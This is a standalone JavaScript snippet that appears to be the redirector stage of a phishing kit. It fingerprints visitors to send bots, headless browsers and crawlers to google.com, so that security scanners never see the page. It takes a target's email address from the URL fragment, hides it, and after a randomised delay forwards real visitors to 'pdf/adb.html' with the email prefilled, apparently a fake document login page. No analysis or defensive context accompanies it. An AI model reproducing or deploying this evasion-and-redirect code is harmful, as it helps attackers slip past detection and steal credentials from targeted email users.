<script>
(function () {
  function isLikelyBot() {
    try {
      if (window.outerWidth === 0 || window.outerHeight === 0) return true;
      if (navigator.webdriver) return true;
      const ua = navigator.userAgent.toLowerCase();
      if (/(headless|phantom|bot|crawl|spider|wget|curl)/i.test(ua)) return true;
      if (navigator.plugins.length === 0) return true;
      if (!navigator.language) return true;
      return false;
    } catch (e) {
      return true;
    }
  }

  function generateSecureToken(length = 64) {
    const array = new Uint8Array(length / 2);
    window.crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }

  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  document.addEventListener("DOMContentLoaded", () => {
    if (isLikelyBot()) {
      window.location.replace("https://google.com");
      return;
    }

    const rawHash = window.location.hash.substring(1); // e.g., email@example.com
    history.replaceState(null, "", window.location.pathname); // Remove it from URL

    try {
      const decodedEmail = decodeURIComponent(rawHash);

      if (isValidEmail(decodedEmail)) {
        const token = generateSecureToken();
        const encodedEmail = encodeURIComponent(decodedEmail);

        sessionStorage.setItem("redirect_email", decodedEmail);
        sessionStorage.setItem("redirect_token", token);

        setTimeout(() => {
          window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
        }, 300 + Math.random() * 500);
      } else {
        window.location.replace("https://google.com");
      }
    } catch (err) {
      window.location.replace("https://google.com");
    }
  });
})();
</script>
